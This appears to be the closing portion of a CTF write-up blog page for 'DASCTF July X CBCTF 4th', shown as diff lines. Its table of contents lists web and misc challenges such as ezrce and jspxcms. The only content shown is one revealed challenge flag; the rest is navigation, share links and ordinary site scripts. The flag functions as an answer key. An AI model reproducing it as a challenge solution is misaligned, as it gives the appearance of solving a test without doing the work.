5tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/75186ee3-07e6-4e8e-8446-b7f6a3c08bf3/1628073094260532/aaef211d4c8254b08abca5e52fbe402cd456c93b.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2e9ec6480d05150c211963984dcbc9f1&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezrce"><span class="toc-number">1.1.</span> <span class="toc-text">ezrce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easythinkphp"><span class="toc-number">1.2.</span> <span class="toc-text">easythinkphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-flag"><span class="toc-number">1.3.</span> <span class="toc-text">cat flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cybercms"><span class="toc-number">1.4.</span> <span class="toc-text">cybercms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jspxcms"><span class="toc-number">1.5.</span> <span class="toc-text">jspxcms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jj%E2%80%99s-camera"><span class="toc-number">1.6.</span> <span class="toc-text">jj’s camera</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#red-vs-blue"><span class="toc-number">2.1.</span> <span class="toc-text">red_vs_blue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#funny-maze"><span class="toc-number">2.2.</span> <span class="toc-text">funny_maze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nuclear-wastewater"><span class="toc-number">2.3.</span> <span class="toc-text">Nuclear wastewater</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-a-GIF"><span class="toc-number">2.4.</span> <span class="toc-text">Just a GIF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezSteganography"><span class="toc-number">2.5.</span> <span class="toc-text">ezSteganography</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&text=DASCTF July X CBCTF 4th"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&is_video=false&description=DASCTF July X CBCTF 4th"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DASCTF July X CBCTF 4th&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/aa6ae99.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&title=DASCTF July X CBCTF 4th"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&name=DASCTF July X CBCTF 4th&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/aa6ae99.html&t=DASCTF July X CBCTF 4th"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="#">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="/zh-TW">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    
+      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
+    
+    
+      <img no-lazy src="/images/beian.png"/>
+      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.3/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.8/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 2,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
